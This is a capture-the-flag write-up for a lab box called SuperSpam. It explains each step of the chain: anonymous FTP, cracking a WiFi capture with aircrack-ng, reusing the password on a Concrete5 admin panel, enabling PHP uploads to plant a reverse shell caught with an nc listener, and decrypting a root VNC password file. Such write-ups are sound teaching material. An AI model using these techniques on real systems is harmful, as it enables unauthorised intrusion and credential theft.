SuperSpam: from a leaked WiFi capture to a root VNC password

An anonymous FTP login hands over a wireless packet capture. Cracking it unlocks a CMS admin panel, a CMS admin panel unlocks code execution, and a trail of the attacker's own sloppy encryption leads all the way to a decrypted root VNC password.

Room: SuperSpam Category: Web / Linux Privesc Tools: aircrack-ng, LinPEAS, vncpwd, CyberChef

The setup: a box exposes HTTP, SSH, anonymous FTP, VNC, and X11. Nothing requires exploitation to get started, the anonymous FTP login alone hands over the first real lead.

The flag itself is omitted below, the chain to reach it is the point.

The Investigation

1
Scan, then walk straight in through anonymous FTP
nmap -sV -sC 10.10.36.244

PORT     STATE SERVICE VERSION
80/tcp   open  ssl/http Apache/2.4.29 (Ubuntu)
4012/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
4019/tcp open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
5901/tcp open  vnc      VNC (protocol 3.8)
|   vnc-info:
|     Security types:
|       VNC Authentication (2)
6001/tcp open  X11      (access denied)

No password needed on the FTP port, just the standard anonymous login:

ftp 10.10.36.244 4019
Name (10.10.36.244:max): anonymous
230 Login successful.
ftp> ls -la
drwxr-xr-x  2 ftp  ftp   4096 Feb 20 14:42 IDS_logs
-rw-r--r--  1 ftp  ftp    526 Feb 20 13:53 note.txt

A follow-up listing inside one of the directories turns up something more interesting, left behind with its own confession attached:

-rw-r--r-- 1 ftp ftp    249 Feb 20 13:36 .quicknote.txt
-rwxr--r-- 1 ftp ftp 370488 Feb 20 14:46 SamsNetwork.cap
Why this works

Anonymous FTP is a classic forgotten door, no exploit required, just a login the server offers for free. A .cap file dropped on it by someone else is effectively evidence left at an unlocked scene.

2
Crack the WiFi capture

Wireshark confirms it's an 802.11 wireless capture, which means a passphrase worth trying to recover:

aircrack-ng -w /usr/share/wordlists/rockyou.txt ~/SamsNetwork.cap

KEY FOUND! [ redacted ]

Cracked in under six minutes against a standard wordlist.

Why this works

A WPA/WPA2 handshake captured in a .cap file is crackable entirely offline, no interaction with the live network needed once the handshake is in hand. A weak, wordlist-guessable passphrase is all it takes.

3
Reuse the WiFi password against the CMS

Port 80 hosts a Concrete5 CMS blog, currently "seized" with a taunting banner: "Linux-Bloggers.com (SEIZED under the Alpha Solaris galactic empire! Long Live Windows!!!) This system has been seized." Each blog post lists its author, giving four candidate usernames to try the cracked WiFi password against:

Lucy_Loser
Donald_Dump
Adam_Admin
Benjamin_Blogger

One of the four logs in with the cracked passphrase, landing in the Concrete5 dashboard.

Why this works

Password reuse across completely unrelated systems (a WiFi network and a CMS login) is extremely common. Four candidate usernames is a small enough list that testing the one known-good password against all of them costs almost nothing.

4
Allow PHP uploads, then upload a reverse shell

Concrete5's System & Settings has an Allowed File Types list under Files that, by default, excludes .php. Adding it back opens the door:

File Extensions to Accept:
php, flv, jpg, gif, jpeg, ico, docx, xla, png, psd, swf, doc, txt, xls, xlsx, csv, pdf, ...

With PHP now accepted, the File Manager takes a standard pentestmonkey reverse shell (rev.php) directly:

Upload Complete: 1 file uploaded
URL to File: http://10.10.214.18/concrete5/application/files/8616/2888/4740/rev.php

Visiting that URL with a listener running catches the callback:

nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.57.21] from (UNKNOWN) [10.10.214.18] 38764

$ whoami
www-data
Why this works

An "allowed file types" setting is an application-level control, not a real security boundary, once an authenticated admin user can change it, it only restricts honest uploads. The upload feature itself was never the vulnerability, the permissive config around it was.

5
Find the attacker's own XOR key-reuse mistake

Poking around as www-data finds a directory holding ten .png files, a xored.py script, and a note. The note is the attacker talking to themselves:

cat note.txt
Note to self. General super spam mentioned that I should not make the same mistake
again of re-using the same key for the XOR encryption of our messages to Alpha
Solaris IV's headquarters, otherwise we could have some serious issues if our
encrypted messages are compromised. I must keep reminding myself, do not re-use
keys, I have done it 8 times already! The most important messages we sent to the
HQ were the first and eighth message. I hope they arrived safely. They are
crucial to our end goal.

Pulling the whole directory down to analyze locally:

wget -r 10.10.214.18:8080/

Opening the images reveals one that renders as readable (if glitchy) text instead of a picture, a telltale sign of XOR-with-a-reused-key against mostly-similar plaintext. It spells out a new password hidden inside the garbled image text.

Why this works

XOR encryption is only as strong as key uniqueness. Reusing the same key across multiple messages means XOR-ing any two ciphertexts together cancels the key out entirely, leaving a relationship between the two plaintexts that often becomes partially readable, exactly what shows up as garbled-but-legible text in one of the images.

6
Pivot to a user with the leaked password, then fix the permissions blocking it

The password recovered from the image turns out to belong to a fifth user, donaldddump, over SSH on the nonstandard port the initial nmap scan found:

dr--r--r-- 6 donalddump donalddump 4096 Apr  9 15:23 donalddump
donalddump@super-spam:/home$ cd donalddump
bash: cd: donalddump: Permission denied

Logged in, but locked out of the own home directory, its permissions are read-only with no execute bit. Fixed directly:

donalddump@super-spam:/home$ chmod -u+x+r+w donalddump
Why this works

A directory without the execute bit can't be entered (cd into) even by its own owner, only listed. Since this account owns the directory, it has the right to fix its own permissions, no exploit needed, just chmod.

7
Find a root-owned VNC password file, and decrypt it

Inside the now-accessible home directory sits a file literally named passwd, owned by root:

-rw-r--r-- 1 root root 8 Apr 8 13:24 passwd
cat passwd
_?=(binary gibberish)

LinPEAS flags the same pattern elsewhere on the box, and the file length is identical to a known VNC password file format:

[+] Searching .vnc directories and their passwd files
/root/.vnc
-rw------- 1 root root 8 Apr  8 13:21 /root/.vnc/passwd

[+] Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /home/donalddump/passwd
passwd file: /root/.vnc/passwd

LinPEAS also confirms root SSH login is permitted, worth keeping in mind:

[+] Searching ssl/ssh files
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
Port 4012
PermitRootLogin yes
ChallengeResponseAuthentication no

VNC passwd files use a known, reversible DES-based obfuscation, not real encryption. A purpose-built decrypter handles it:

git clone https://github.com/jeroennijhof/vncpwd
sudo cp vncpwd /usr/local/bin/

vncpwd passwd
Password: redacted
Why this works

VNC's classic password scheme is a fixed-key DES cipher, not a hash, it's reversible by design once you know the (publicly known) key. A root-owned file with that exact format and length is effectively root's password sitting in plain sight for anyone with the right decoder.

8
Log into VNC as root, read the final flag
vncviewer 10.10.214.18:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (super-spam:1)"

A root shell inside the VNC session finds the flag file:

root@super-spam:~# cd .nothing/
root@super-spam:~/.nothing# ls -la
-rw-r--r-- 1 root root 377 Feb 20 17:12 r00t.txt

Its contents aren't plaintext, pasting into CyberChef's Magic recipe auto-detects the encoding chain (layered Base32/Base64) and decodes it to a short farewell message from the box's antagonist, confirming the chain is complete.

Why this works

CyberChef's Magic operation brute-forces common encodings and scores the results by how much they look like real language, useful exactly when you can see something is encoded but don't know which scheme. Chained encodings that would take several manual decode steps collapse into one click.

Full Attack Chain

Anonymous FTP → SamsNetwork.cap leaked
  → aircrack-ng: WiFi passphrase cracked
       → reused as CMS login for one of four blog authors
            → Allowed File Types edited to accept .php
                 → PHP reverse shell uploaded, foothold as www-data
                      → attacker's own XOR key-reuse note found
                           → garbled image reveals a second password
                                → SSH as donalddump, home dir chmod'd open
                                     → root-owned VNC passwd file found
                                          → vncpwd decrypts it
                                               → VNC login as root, flag read
